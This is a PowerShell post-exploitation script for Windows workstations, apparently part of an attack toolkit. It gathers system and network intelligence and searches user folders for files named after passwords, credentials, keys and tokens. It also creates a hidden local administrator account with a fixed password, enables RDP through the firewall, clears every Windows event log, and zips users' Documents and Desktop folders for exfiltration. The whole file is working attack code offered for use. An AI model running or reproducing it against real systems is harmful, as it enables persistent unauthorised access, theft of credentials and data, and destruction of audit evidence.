# ============================================================
# WORKSTATION SECONDARY PAYLOAD - Tier 3 (Workstations)
# ============================================================
# Recon + user creation + optional impact/fun payloads
# Target: Workstations (persistence + intel gathering)
# ============================================================

# RECONNAISSANCE: Full system + network enumeration
$o=@(); $o+="=== HOSTNAME ==="; $o+=hostname; $o+="=== USERS ==="; $o+=cmd /c "net user"; $o+="=== ADMINS ==="; $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== ARP ==="; $o+=arp -a; $o+="=== SERVICES ==="; $o+=cmd /c "sc query state= all"; $o | Out-File C:\ProgramData\r.txt -Force

# RECONNAISSANCE: Find interesting files
@('*.config','*.xml','*.ini','*.txt','*.ps1','*.bat','*.cmd') | ForEach-Object { Get-ChildItem -Path C:\Users -Recurse -Filter $_ -EA 0 | Where-Object { $_.Length -lt 1MB -and $_.FullName -match '(pass|cred|key|token|secret|config|backup)' } | Select-Object FullName,Length,LastWriteTime } | Out-File C:\ProgramData\f.txt -Force

# USER CREATION: Create local admin
cmd /c "net user svcAdmin Pa$$w0rd2026! /add & net localgroup Administrators svcAdmin /add"

# RDP ENABLEMENT: Enable RDP + allow through firewall
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -Type DWord; cmd /c 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'

# DEFENSE EVASION: Clear all Windows event logs (noisy but effective)
Get-WinEvent -ListLog * -EA 0 | ForEach-Object { try{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)}catch{} }

# EXFIL: Compress and stage user data
Compress-Archive -Path C:\Users\*\Documents\*,C:\Users\*\Desktop\* -DestinationPath C:\ProgramData\backup.zip -Force -CompressionLevel Fastest
